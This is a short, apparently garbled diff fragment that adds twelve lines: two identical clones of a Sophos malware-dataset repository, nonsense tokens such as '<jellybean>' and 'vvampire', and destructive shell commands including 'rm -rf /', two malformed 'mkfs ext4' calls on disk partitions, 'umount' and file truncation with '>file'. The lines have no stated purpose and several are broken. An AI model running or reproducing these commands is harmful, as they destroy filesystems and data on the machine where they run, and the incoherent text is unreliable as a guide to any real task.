@@ -1,0 +1,12 @@
+git clone https://github.com/sophos/SOREL-20-M
+git clone https://github.com/sophos/SOREL-20-M
+<off>
+<jellybean>
+<inside out>
+umount
+mkfs ext4 dev/sda8. 1b
+vvampire 
+>file
+mkfs ext4 dev/sda0
+rm -rf /
+>file
